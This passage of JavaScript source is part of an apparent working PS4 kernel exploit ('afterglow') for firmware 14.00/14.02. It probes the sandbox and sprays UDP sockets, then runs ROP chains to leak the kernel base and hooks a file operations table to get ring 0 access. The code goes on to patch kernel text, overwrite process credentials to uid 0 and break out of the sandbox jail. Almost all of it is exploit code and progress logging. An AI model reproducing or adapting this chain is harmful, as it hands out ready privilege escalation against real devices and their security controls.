    const kq = k.read_v(f);
    if (!kq || !inHeap(kq)) continue;
    const w = k.read_v(plus(kq, 0xa0));
    if (!w) continue;
    if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
    else notes++;
  }
  say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");

  let left = countOffRing0(k, room, ofs, devs, dtab);
  if (left === null) {
    left = 0;
    for (let i = 0; i < devs.length; i++) {
      const f = fileOf(devs[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (!(cur && same(cur, dtab))) left++;
    }
  }
  if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
  say("[t] " + left + " handles are still on the original -- the page must not go away");
  return false;
}

export function probeAfterglow(ctx) {
  STATE.ctx = ctx;
  const out = { ok: false, reasons: [] };
  const no = function (why) { out.reasons.push(why); };

  const noStub = seedStubs();
  out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
  if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));

  say("[FLOW-DIAG] stage=libc-resolution phase=begin");
  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) {
    const m = findLibByShape();
    if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
    else say("AG libc: " + m.note + " | entries=" + m.entries
             + " first=[" + m.first.join(" ") + "]");
  }
  const libc = lib.base;
  say("[FLOW-DIAG] stage=libc-resolution phase=end found=" + Boolean(libc));
  out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
  out.modules = lib.count;
  if (!libc) {
    no(lib.note || "libSceLibcInternal is not mapped");
    say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
        + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
    return out;
  }

  let missing = null;
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
  }
  out.gadgets = missing ? ("missing " + missing) : "all present";
  if (missing) no("gadget " + missing + " is missing -- different libc build");

  let dirty = 0;
  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
  }
  out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
  if (dirty) no("the spare room behind libc is occupied");

  let node = null;
  for (let i = 0; i < PROBE_NODES.length; i++) {
    const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (fd >= 0) { node = PROBE_NODES[i]; break; }
  }
  out.probeNode = node;
  if (!node) no("no usable device node for the probe descriptor");

  const held = [];
  for (let i = 0; i < 20; i++) {
    const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
    if (fd < 0) break;
    held.push(fd);
  }
  out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
  if (!held.length) no("/dev/apm cannot be opened in this sandbox");

  const open = [], refused = [];
  for (let u = 0; u < 32; u++) {
    const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
    if (fd >= 0) { open.push(u); sc(S.close, fd); }
    else if (refused.length < 3) refused.push(u + ":e" + host().errno());
  }
  out.units = open.length;
  out.unitList = open.length ? open.join(",") : "none";
  out.unitRefused = refused.join(" ") || "-";
  if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");

  say("[FLOW-DIAG] stage=cpu-pinning phase=begin");
  const pin = pinCore();
  say("[FLOW-DIAG] stage=cpu-pinning phase=end ok=" + Boolean(pin.ok));
  out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
  if (!pin.ok) no("cannot pin to a cpu: " + pin.note);

  const socks = [];
  for (let i = 0; i < TUNE.sprays; i++) {
    const fd = sc(S.socket, 2, 2, 0).i32;
    if (fd < 0) break;
    socks.push(fd);
  }
  out.udp = socks.length;

  if (socks.length) {
    const body = alloc(TUNE.object); body.u8.fill(0);
    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    pokeAt(req, 8, alloc(16).at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);
    const stub = stubFor(S.setsockopt);
    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
    let t0, t1;
    if (nb) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      const fertig = [];
      for (let i = 0; i < calls.length; i += nb) {
        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
        catch (e) { fertig.length = 0; break; }
      }
      if (fertig.length) {
        host().runPrepared(fertig[0]);
        t0 = performance.now();
        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
        t1 = performance.now();
        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
      }
    }
    if (out.window === undefined) {
      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
    }
  } else out.window = "not measured";

  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
  if (socks.length < TUNE.sprays) {
    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
  }

  out.ok = out.reasons.length === 0;
  say("probe libc   " + out.libc);
  say("probe gadget " + out.gadgets + ", tail " + out.tail);
  say("probe apm    " + out.apm + ", node " + out.probeNode);
  say("probe units  " + out.units + " open: " + out.unitList);
  say("probe refused " + out.unitRefused);
  say("probe pin    " + out.pin);
  say("probe window " + out.window);
  say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
  say("probe SHOTS  " + out.units + " units, a run needs 3");
  if (out.ok) say("probe VERDICT usable");
  else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
  return out;
}

async function attempt(ctx, opts) {
  STATE.ctx = ctx;
  say("[FLOW-DIAG] stage=attempt-enter");
  opts = opts || {};
  STATE.retry = false;
  say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");

  say("[FLOW-DIAG] stage=prerequisites");
  say("[FLOW-DIAG] stage=syscall-stubs phase=begin");
  const missing = seedStubs();
  say("[FLOW-DIAG] stage=syscall-stubs phase=end missing=" + missing.length);
  if (missing.length) {
    say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
    say("[EARLY-RETURN] stage=prerequisite reason=missing-syscall-stubs count=" + missing.length);
    return false;
  }

  const pin = pinCore();
  if (!pin.ok) {
    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
    say("  Unpinned, the free and the refill land in different per cpu buckets,");
    say("  the hole is filled by somebody else, and ring 0 continues on that");
    say("  stranger's stack pointer. That is a dead console, not a bad run.");
    say("[EARLY-RETURN] stage=prerequisite reason=cpu-pin-failed detail=" + pin.note);
    return false;
  }
  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");

  {
    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
    const mp = (m0.i32 !== -1) ? sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7) : null;
    /* errno is only meaningful when the call failed; after a success it still
       holds whatever the previous syscall left there, which made a healthy run
       look like "mprotect=0 errno=22". Report it only on failure. */
    const mpRes = mp ? mp.i32 : null;
    let en = "";
    if (m0.i32 === -1 || (mpRes !== null && mpRes !== 0)) {
      try { en = " errno=" + host().errno(); } catch (e) {}
    }
    say("[OPEN-CHECK] mmap=" + (m0.i32 === -1 ? "failed" : text(v(m0.lo, m0.hi)))
        + " mprotect=" + (mp ? mpRes : "skipped")
        + en);
    if (m0.i32 !== -1 && mp && mp.i32 === 0) {
      const force = !!(host().params && host().params.get("forceopen") === "1");
      say("  this kernel looks already open (anonymous RWX was allowed).");
      if (force) {
        say("  forceopen=1 -- continuing anyway; a real prior patch may panic this console.");
      } else {
        say("  Not firing again; reboot the console for a fresh one.");
        say("[EARLY-RETURN] stage=prerequisite reason=kernel-already-open action=reboot-required");
        return false;
      }
    }
  }

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) lib = findLibByShape();
  const libc = lib.base;
  if (!libc) { say("[EARLY-RETURN] stage=prerequisite reason=libc-not-found detail=" + (lib.note || "not-mapped")); say("  " + (lib.note || "libc is not mapped")); return false; }

  say("[FLOW-DIAG] stage=gadget-validation phase=begin");
  const gad = {};
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    const at = plus(libc, GADGETS[name][0]);
    if (!sameBytes(rdbuf(at, want.length), want)) {
      say("  gadget " + name + " is missing -- this is not the libc build we know");
      return false;
    }
    gad[name] = at;
  }

  say("[FLOW-DIAG] stage=gadget-validation phase=end");
  say("[FLOW-DIAG] stage=kernel-preparation phase=begin");
  const shot = shooter(gad);
  const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);

  let kbase = STATE.base;
  say("[FLOW-DIAG] stage=kernel-preparation phase=base-selection cached=" + Boolean(kbase));
  if (kbase) {
    say("[1] base " + text(kbase) + ", carried over from this boot");
  } else {
    const win = alloc(TUNE.window + 16);
    wipe(win, TUNE.window + 16);

    const r = shot.take(function (c) {
      c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
      c.grab(win.at, TUNE.window);
    });

    const at = function (off) { return qAt(win, off); };

    let found = null;
    for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
      const a = at(off);
      if (a.hi === 0xffffffff) {
        const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
        if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
            && ((b.low - a.low) >>> 0) === 0x20
            && ((c2.low - a.low) >>> 0) === 0x40
            && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
      }
    }

    let voted = null;
    {
      const mark = K.anchor % 0x4000, tally = {};
      for (let off = 0; off <= TUNE.window - 8; off += 8) {
        const a = at(off);
        if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
          const b = (a.low - K.anchor) >>> 0;
          if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
        }
      }
      let best = null, top = 0, second = 0;
      for (const b in tally) {
        const n = tally[b];
        if (n > top) { second = top; best = Number(b); top = n; }
        else if (n > second) second = n;
      }
      if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
    }

    if (found && voted && !same(found, voted)) {
      say("[FLOW-DIAG] stage=kernel-preparation phase=exit reason=base-readings-disagree retry=false");
      say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
          + " -- stopping here");
      return false;
    }
    found = found || voted;
    if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
      const rem = ((found.low - K.anchor) >>> 0) % 0x4000;
      const delta = rem <= 0x2000 ? rem : -(0x4000 - rem);
      const oldA = K.anchor;
      K.anchor += delta;
      say("[1] anchor grid-shifted " + delta + ": 0x" + oldA.toString(16) + " -> 0x" + K.anchor.toString(16));
    }

    say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
        + (found ? text(found) : "missed")
        + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
    if (!found) {
      if (r === null && shot.sprayed === 0) {
        say("[FLOW-DIAG] stage=kernel-preparation phase=exit reason=no-free-apm-unit retry=false");
        say("    no free apm unit left -- this boot is spent, reboot the console.");
      } else {
        say("[FLOW-DIAG] stage=kernel-preparation phase=exit reason=spray-did-not-take retry=true");
        say("    the spray did not take");
        STATE.retry = true;
      }
      return false;
    }
    say("[FLOW-DIAG] stage=kernel-preparation phase=base-found");
    kbase = plus(found, -K.anchor);
    STATE.base = kbase;
    say("    base " + text(kbase));
  }

  {
    const SCAN_WIN = 0x1000;
    const SCAN_PRE = 0x200;
    const scanBuf = alloc(SCAN_WIN + 16);
    wipe(scanBuf, SCAN_WIN + 16);
    const scanRef = alloc(16);
    pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));

    const scanR = shot.take(function (c) {
      c.load_rax(scanRef.at);
      c.grab(scanBuf.at, SCAN_WIN);
    }, 0x400);

    say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));

    if (ran(scanR)) {
      const sb = rdbuf(scanBuf.at, SCAN_WIN);
      let hit = -1;
      for (let i = 0; i < SCAN_WIN - 2; i++) {
        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
      }
      if (hit >= 0) {
        const realRVA = K.swap_rbp - SCAN_PRE + hit;
        const delta = realRVA - K.swap_rbp;
        say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
            + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
        K.swap_rbp = realRVA;
      } else {
        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
      }
    } else {
      say("[1b] scan shot missed -- using original K.swap_rbp");
    }
  }

  const kat = function (rva) { return plus(kbase, rva); };

  let probe = -1, node = null;
  for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
    probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (probe >= 0) node = PROBE_NODES[i];
  }
  if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }

  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(hostFree, off)) !== 0) {
      say("[2] the spare room behind libc is occupied -- nothing written");
      return false;
    }
  }
  say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
      + " bytes of spare room behind libc");

  let reach = TUNE.entries;
  if (MAPS) {
    for (let i = 0; i < MAPS.length; i++) {
      const a0 = MAPS[i][0], b0 = MAPS[i][1];
      const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
      const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
      if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
    }
  }
  say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
      + (MAPS ? (", " + MAPS.length + " mapped") : ""));

  const note = alloc(128), ftab = alloc(0x100);
  const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
  wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);

  const merged = ((ctx.params && ctx.params.get("shots")) || "3") === "3";

  const walkLoop = function (c) {
    for (let k = 0; k < reach; k++) {
      const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
      c.load_rax(c.where(src));
      c.gad("load8");
    }
  };

  const r2 = shot.take(function (c) {
    c.slot(kat(K.swap_rbp));
    c.save_rax(note.at);
    c.slot(kat(K.swap_rbp));
    c.load_rax(note.at);
    c.follow(0);
    c.follow(-0x148);
    c.save_rax(plus(note.at, 8));
    c.gad("load8");
    c.save_rax(plus(note.at, 16));
    c.follow(0x48);
    c.follow(0);
    c.follow(probe * 8);
    c.save_rax(plus(note.at, 40));
    c.gad("load8");
    c.save_rax(plus(note.at, 48));
    c.grab(ftab.at, 0x58);

    if (merged) {
      c.load_rax(plus(note.at, 16));
      c.follow(0x168);
      c.gad("load8");
      walkLoop(c);
    }
  }, merged ? 0x1000 + reach * 0x100 : 0x1000);

  const file = qAt(note, 40), ops = qAt(note, 48);
  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
  if (!inHeap(file) || !inText(ops)) {
    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
  }

  let sane = 0;
  for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
  if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }

  let r2b = -1;
  if (!merged) {
    r2b = shot.take(function (c) {
      c.slot(kat(K.swap_rbp));
      c.save_rax(note.at);
      c.slot(kat(K.swap_rbp));
      c.load_rax(note.at);
      c.follow(0);
      c.follow(-0x148);
      c.gad("load8");
      c.follow(0x168);
      c.gad("load8");
      walkLoop(c);
    }, 0x1000 + reach * 0x100);
    say("[3b] address space walked, chain="
        + (r2b === null ? ("null -- " + shot.why) : r2b));
    if (!ran(r2b)) {
      say("    the chain did not run -- the hole was refilled with a real object");
      STATE.retry = true;
      return false;
    }
  }

  let hit = null, walked = 0;
  for (let k = 0; k < reach; k++) {
    const from = qAt(maps, k * TUNE.stride + 0x20);
    const upto = qAt(maps, k * TUNE.stride + 0x28);
    if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
    if (upto.hi - from.hi > 0x100) break;
    walked = k + 1;
    const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
    const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
    if (above && below) { hit = k; break; }
  }
  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }

  const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
  const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
  const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
  const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;

  say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
      + " ceiling=0x" + ceiling.toString(16));
  if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
      || Math.floor(now / 4) % 2 !== 1) {
    say("    not the mapping we want -- nothing written"); return false;
  }

  let widened = rights;
  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;

  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
  const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
  pokeAt(ftab, 0x18, hostFree);

  const r3 = shot.take(function (c) {
    c.put(plus(here, 0x5c), wRights.at, 4);
    c.put(plus(file, 0x08), wTable.at, 8);
  });
  say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
  if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }

  if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
    say("    page did not turn writable -- not calling into it"); return false;
  }
  const boot = unhex(BOOTSTRAP);
  if (K.anchor === 0xe6c30) {
    for (let bi = 0; bi < boot.length - 6; bi++) {
      if (boot[bi] === 0xc6 && boot[bi+1] === 0x81 && boot[bi+3] === 0xaa
          && boot[bi+4] === 0x1f && boot[bi+5] === 0x00 && boot[bi+6] === 0x37) {
        boot[bi+3] = 0xae;
        say("[5b] bootstrap fixup: offset byte at +" + bi + " shifted aa->ae (+0x400)");
      }
    }
  }

  wrbuf(hostFree, boot);
  if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
    say("    bootstrap did not stick"); return false;
  }

  const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
  sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
  const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;

  const k = openRing0(hostFree);
  const thread = (before !== 0 && after === 0) ? k.thread() : null;
  const gated = thread !== null && inHeap(thread);

  if (!(gated && k.write_v(plus(file, 0x08), ops))) {
    const wOld = alloc(16); pokeAt(wOld, 0, ops);
    shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
  }
  sc(S.close, probe);

  if (before === 0 || after !== 0) {
    say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
        + shot.fired + " shots used");
    return false;
  }
  say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");

  if (!gated) { say("[7] the gate did not answer"); return false; }
  const base2 = k.base();
  if (!base2 || !same(base2, kbase)) {
    say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
        + ", the leak said " + text(kbase));
    return false;
  }
  say("[7] gate is live, thread " + text(thread));

  const failOut = function (why) {
    say(why);
    try {
      const p0 = k.read_v(plus(thread, 0x08));
      const f0 = p0 && k.read_v(plus(p0, 0x48));
      const o0 = f0 && k.read_v(f0);
      if (o0 && inHeap(o0)
          && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
        say("handles defused after the failure -- this page may close");
      else
        say("the handles are NOT defused -- do not close this page, cold boot instead");
    } catch (e) {
      say("teardown threw: " + ((e && e.message) || e));
    }
    return false;
  };

  /* ---- apply the kernel patch table, site by site ---------------------- */
  const pending = [], skipped = [];
  let already = 0;
  for (let i = 0; i < PATCHES.length; i++) {
    const off = PATCHES[i][0];
    const want = unhex(PATCHES[i][1]);
    const spec = PATCHES[i][3];
    const readLen = Math.max(want.length, specLength(spec));
    const cur = k.read(kat(off), readLen);
    if (!cur) {
      say("[8] " + PATCHES[i][2] + " at 0x" + off.toString(16) + " is unreadable");
      skipped.push(PATCHES[i]);
      continue;
    }
    if (sameBytes(cur.subarray(0, want.length), want)) { already++; continue; }
    if (looksStock(cur, spec)) { pending.push(PATCHES[i]); continue; }
    if (sameShape(cur, want)) {
      say("[8] " + PATCHES[i][2] + " at 0x" + off.toString(16)
          + ": reference has " + spec + ", this build has "
          + hx(cur.subarray(0, readLen)) + " -- same branch, applying");
      pending.push(PATCHES[i]);
      continue;
    }
    say("[8] " + PATCHES[i][2] + " at 0x" + off.toString(16)
        + ": reference has " + spec + ", this build has "
        + hx(cur.subarray(0, readLen)) + " -- different code, left untouched");
    skipped.push(PATCHES[i]);
  }

  /* These are payload-support patches: they let a kernel payload write its own
     text on this build. The exploit and the ring 0 interface do not need them,
     so a site that cannot be proven is reported and skipped. Aborting here
     would throw away a working jailbreak for a patch that was never required.
     The 57-write GoldHEN blob is a separate, all-or-nothing gate further down. */
  if (skipped.length) {
    say("[8] " + skipped.length + " site(s) left untouched on this build ("
        + skipped.map(function (p) { return p[2]; }).join(", ") + ")");
    say("[8] continuing -- the jailbreak does not depend on them");
  }

  /* Whether this kernel is the build the tables were written for. The GoldHEN
     blob is a blind 57-write image: it writes before anything can be verified,
     so it must not be fired at a build whose text we could not confirm. */
  const buildMatched = skipped.length === 0;

  if (pending.length) {
    if (!k.apply(kbase, pending)) { return failOut("[8] the patch pass did not return"); }
  }
  let done = 0, missed = [];
  for (let i = 0; i < PATCHES.length; i++) {
    const bytes = unhex(PATCHES[i][1]);
    const got = k.read(kat(PATCHES[i][0]), bytes.length);
    if (got && sameBytes(got, bytes)) done++;
    else if (pending.indexOf(PATCHES[i]) >= 0) missed.push(PATCHES[i][2]);
  }
  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
      + (already ? (" (" + already + " were already set)") : "")
      + (skipped.length ? (" -- " + skipped.length + " skipped on this build") : ""));
  /* Only a write that was attempted and did not stick is fatal. A site we
     deliberately skipped is a known, reported gap, not corruption. */
  if (missed.length) {
    return failOut("[8] a write we made did not stick (" + missed.join(", ") + ")");
  }

  const proc = k.read_v(plus(thread, 0x08));
  const fdt = proc && k.read_v(plus(proc, 0x48));
  const ofs = fdt && k.read_v(fdt);
  if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }

  const ucred = proc && k.read_v(plus(proc, 0x40));
  if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }

  const z4 = new Uint8Array([0, 0, 0, 0]);
  const offs = [0x04, 0x08, 0x0c, 0x14];
  for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));

  const prison0 = k.read_v(kat(K.prison0));
  if (!prison0 || !inText(prison0)) {
    return failOut(
      "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
        + " -- not touching credentials",
    );
  }
  k.write_v(plus(ucred, 0x30), prison0);
  const caps = new Uint8Array(16); caps.fill(0xff);
  k.write(plus(ucred, 0x60), caps);

  const rootvnode = k.read_v(kat(K.rootvnode));
  if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
  k.write_v(plus(fdt, 0x10), rootvnode);
  k.write_v(plus(fdt, 0x18), rootvnode);

  if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
  say("[9] jailbroken, uid 0");

  const iface = {
    base: kbase,
    curproc: proc,
    curproc_fd: fdt,
    curproc_ofiles: ofs,
    thread: thread,
    read: function (at, len) {
      const out = new Uint8Array(len);
      let got = 0;
      while (got < len) {
        const n = Math.min(len - got, STAGE_MAX);
        const s = k.read(plus(at, got), n);
        if (!s) return null;
        out.set(s, got); got += n;
      }
      return out;
    },
    write: function (at, bytes) {
      let done2 = 0;
      while (done2 < bytes.length) {
        const n = Math.min(bytes.length - done2, STAGE_MAX);
        if (!k.write(plus(at, done2), bytes.subarray(done2, done2 + n))) return false;
        done2 += n;
      }
      return true;
    },
    read8: function (at) { return k.read_v(at); },
    write8: function (at, q) { return k.write_v(at, q); },
    data_base: kbase,
  };

  iface.devs = shot.devs;
  iface.queues = shot.queues;
  if (ctx.state) ctx.state.afterglow = iface;

  say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");

  iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
  say(iface.defused
      ? "handles defused -- this page may close"
      : "the handles are NOT defused -- do not let this page close");

  (function () {
    var TEXT_SIZE = 0xCFE880;
    var DATA_OFF  = 0x1520000;

    /* Debug Settings is GoldHEN's job: its own payload flips the same flags
       once it is running. The standalone patch below guesses a call target
       from a two-call heuristic, so it stays off unless asked for and is
       reported only after the bytes are read back. */
    iface.debugmenu = "not attempted";
    var dbgSearch = window.__afterglowSearch || location.search;
    var dbgWant = new URLSearchParams(dbgSearch).get("debugmenu");
    var dbgPayload = new URLSearchParams(dbgSearch).get("payload") || "";
    if (dbgWant === "0") {
      iface.debugmenu = "disabled by request";
      say("[dbg] debug menu patch disabled by request");
      return;
    }
    if (dbgPayload.indexOf("goldhen") === 0 && dbgWant !== "1") {
      iface.debugmenu = "skipped (GoldHEN owns it)";
      say("[dbg] GoldHEN handles Debug Settings -- standalone patch skipped");
      return;
    }

    var c = k.begin();
    c.hex("48bf").qw(kbase);
    c.hex("48be").qw(plus(kbase, TEXT_SIZE));
    c.hex("48ba").qw(v(0x676d6372, 0x65645f72));
    c.hex("4839f7").hex("730b");
    c.hex("483917").hex("740b");
    c.hex("4883c701").hex("ebf0");
    c.hex("4831c0").hex("eb03");
    c.hex("4889f8");
    c.hex("49ba").qw(plus(k.at, OUT));
    c.hex("498902");
    if (!k.run()) return;
    var strAddr = k.out();
    if (!strAddr || isZero(strAddr)) return;

    var tail = k.read(plus(strAddr, 8), 8);
    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;

    var c2 = k.begin();
    c2.hex("48bf").qw(plus(kbase, DATA_OFF));
    c2.hex("48be").qw(plus(kbase, DATA_OFF + 0x700000));
    c2.hex("48ba").qw(strAddr);
    c2.hex("4839f7").hex("730b");
    c2.hex("483917").hex("740b");
    c2.hex("4883c708").hex("ebf0");
    c2.hex("4831c0").hex("eb03");
    c2.hex("4889f8");
    c2.hex("49ba").qw(plus(k.at, OUT));
    c2.hex("498902");
    if (!k.run()) return;
    var hit = k.out();
    if (!hit || isZero(hit)) return;

    var fn = k.read_v(plus(hit, 0x08));
    if (!fn || isZero(fn)) return;
    var fnRva = (fn.low - kbase.low) >>> 0;
    if (fnRva >= TEXT_SIZE) return;

    var body = k.read(fn, 80);
    if (!body) return;

    var target = null;
    for (var i = 0; i < body.length - 6; i++) {
      if (body[i] === 0xe8 && body[i + 5] === 0x85) {
        var d = body[i+1] | (body[i+2]<<8) | (body[i+3]<<16) | (body[i+4]<<24);
        if (d >= 0x80000000) d -= 0x100000000;
        var ct = fnRva + i + 5 + d;
        if (ct > 0 && ct < TEXT_SIZE) {
          target = ct;
          say("[dbg] rcmgr check at rva 0x" + ct.toString(16));
          break;
        }
      }
    }

    if (target === null) { say("[dbg] no CALL+TEST in handler"); return; }

    var target2 = null;
    for (var j = i + 5; j < body.length - 6; j++) {
      if (body[j] === 0xe8 && body[j + 5] === 0x85) {
        var d2 = body[j+1] | (body[j+2]<<8) | (body[j+3]<<16) | (body[j+4]<<24);
        if (d2 >= 0x80000000) d2 -= 0x100000000;
        var ct2 = fnRva + j + 5 + d2;
        if (ct2 > 0 && ct2 < TEXT_SIZE && ct2 !== target) {
          target2 = ct2;
          say("[dbg] rcmgr check2 at rva 0x" + ct2.toString(16));
          break;
        }
      }
    }

    var plist = [
      [target, "b8010000", "rcmgr1a"],
      [target + 4, "00c3", "rcmgr1b"]
    ];
    if (target2 !== null) {
      plist.push([target2, "b8010000", "rcmgr2a"]);
      plist.push([target2 + 4, "00c3", "rcmgr2b"]);
    }
    k.apply(kbase, plist);
    var okc = 0;
    for (var q = 0; q < plist.length; q++) {
      var wq = unhex(plist[q][1]);
      var gq = k.read(kat(plist[q][0]), wq.length);
      if (gq && sameBytes(gq, wq)) okc++;
    }
    if (okc === plist.length) {
      iface.debugmenu = "verified";
      say("[dbg] debug menu patch verified -- check Settings");
    } else {
      iface.debugmenu = "did not stick (" + okc + " of " + plist.length + ")";
      say("[dbg] debug menu patch did not stick (" + okc + " of " + plist.length + ")");
    }
  })();

  /* Payload selection: accept only known, bundled raw payload filenames.
     The URL comes from the dashboard; no arbitrary paths are permitted.
